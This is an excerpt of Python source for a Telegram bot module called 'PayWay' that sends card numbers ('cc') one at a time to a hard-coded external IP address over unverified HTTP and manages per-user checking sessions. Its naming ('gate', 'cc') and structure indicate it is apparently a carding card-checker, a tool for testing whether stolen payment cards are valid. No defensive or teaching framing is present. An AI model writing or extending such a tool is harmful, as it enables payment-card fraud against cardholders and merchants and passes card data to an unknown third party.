...
GATE_NAME = "PayWay"
GATE_CMD = "mpw"
MPW_API = "http://5.83.136.66:8004/payway?cc={cc}"
active_sessions = {}
...
def process_single_card(card):
    try:
        resp = requests.get(MPW_API.format(cc=card), timeout=90, verify=False)
        if resp.status_code == 200:
            data = resp.json()
...
@router.message(Command("mpw"))
async def mpw_command(message: types.Message):
...
@router.callback_query(F.data.startswith("mpw_card_"))
async def mpw_card_callback(callback: types.CallbackQuery):
...
@router.callback_query(F.data.startswith("mpw_response_"))
async def mpw_response_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mpw_stop_"))
async def mpw_stop_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
...
@router.callback_query(F.data.startswith("mpw_pause_"))
async def mpw_pause_callback(callback: types.CallbackQuery):
    user_id = int(callback.data.split("_")[2])
    if user_id != callback.from_user.id:
        await callback.answer("❌ Not your session!", show_alert=True)
        return
